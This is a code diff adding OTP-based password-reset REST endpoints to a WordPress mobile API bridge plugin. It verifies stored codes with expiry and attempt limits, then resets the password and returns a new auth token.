+		$saved_code = get_user_meta( $user->ID, '_eta_pwd_reset_code', true );
+		$expires    = (int) get_user_meta( $user->ID, '_eta_pwd_reset_expires', true );
+		$attempts   = (int) get_user_meta( $user->ID, '_eta_pwd_reset_attempts', true );
+
+		if ( empty( $saved_code ) ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'No active reset request found. Please request a new code.',
+			), 400 );
+		}
+
+		if ( time() > $expires ) {
+			delete_user_meta( $user->ID, '_eta_pwd_reset_code' );
+			delete_user_meta( $user->ID, '_eta_pwd_reset_expires' );
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Verification code has expired. Please request a new one.',
+			), 400 );
+		}
+
+		if ( $attempts >= 5 ) {
+			delete_user_meta( $user->ID, '_eta_pwd_reset_code' );
+			delete_user_meta( $user->ID, '_eta_pwd_reset_expires' );
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Too many incorrect attempts. Please request a new verification code.',
+			), 429 );
+		}
+
+		if ( trim( (string) $saved_code ) !== trim( (string) $code ) ) {
+			update_user_meta( $user->ID, '_eta_pwd_reset_attempts', $attempts + 1 );
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Invalid verification code. Please check your email and try again.',
+			), 400 );
+		}
+
+		return new WP_REST_Response( array(
+			'success' => true,
+			'message' => 'Verification code is valid.',
+		), 200 );
+	}
+
+	/**
+	 * POST /wp-json/eta/v1/auth/reset-password
+	 * Verifies OTP code, updates password in database, and returns auto-login token + profile.
+	 */
+	public function handle_reset_password( $request ) {
+		$params = $request->get_json_params() ?: $request->get_params();
+		$login_or_email = sanitize_text_field( $params['email'] ?? $params['username'] ?? '' );
+		$code           = sanitize_text_field( $params['code'] ?? $params['otp'] ?? '' );
+		$new_password   = $params['password'] ?? $params['new_password'] ?? '';
+
+		if ( empty( $login_or_email ) || empty( $code ) || empty( $new_password ) ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Email, verification code, and new password are required.',
+			), 400 );
+		}
+
+		if ( strlen( $new_password ) < 6 ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'New password must be at least 6 characters long.',
+			), 400 );
+		}
+
+		$user = is_email( $login_or_email ) ? get_user_by( 'email', $login_or_email ) : get_user_by( 'login', $login_or_email );
+		if ( ! $user ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'No account found with this email address.',
+			), 404 );
+		}
+
+		$saved_code = get_user_meta( $user->ID, '_eta_pwd_reset_code', true );
+		$expires    = (int) get_user_meta( $user->ID, '_eta_pwd_reset_expires', true );
+		$attempts   = (int) get_user_meta( $user->ID, '_eta_pwd_reset_attempts', true );
+
+		if ( empty( $saved_code ) || time() > $expires ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Verification code has expired or is invalid. Please request a new code.',
+			), 400 );
+		}
+
+		if ( $attempts >= 5 ) {
+			delete_user_meta( $user->ID, '_eta_pwd_reset_code' );
+			delete_user_meta( $user->ID, '_eta_pwd_reset_expires' );
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Too many incorrect attempts. Please request a new verification code.',
+			), 429 );
+		}
+
+		if ( trim( (string) $saved_code ) !== trim( (string) $code ) ) {
+			update_user_meta( $user->ID, '_eta_pwd_reset_attempts', $attempts + 1 );
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Invalid verification code. Please check your email and try again.',
+			), 400 );
+		}
+
+		// Update password in WordPress database
+		wp_set_password( $new_password, $user->ID );
+
+		// Clear reset metadata
+		delete_user_meta( $user->ID, '_eta_pwd_reset_code' );
+		delete_user_meta( $user->ID, '_eta_pwd_reset_expires' );
+		delete_user_meta( $user->ID, '_eta_pwd_reset_attempts' );
+
+		// Generate fresh auth token for instant auto-login
+		$token = wp_generate_password( 32, false );
+		update_user_meta( $user->ID, '_eta_app_auth_token', $token );
+
+		// Format updated user profile
+		$user_profile = $this->format_user_profile_data( $user->ID );
+
+		return new WP_REST_Response( array(
+			'success' => true,
+			'message' => 'Password has been reset successfully.',
+			'token'   => $token,
+			'user'    => $user_profile,
+		), 200 );
+	}
+
 }
 
 // Bootstrap mobile bridge
 new ETA_Mobile_API_Bridge();
+
+} // End if ! class_exists
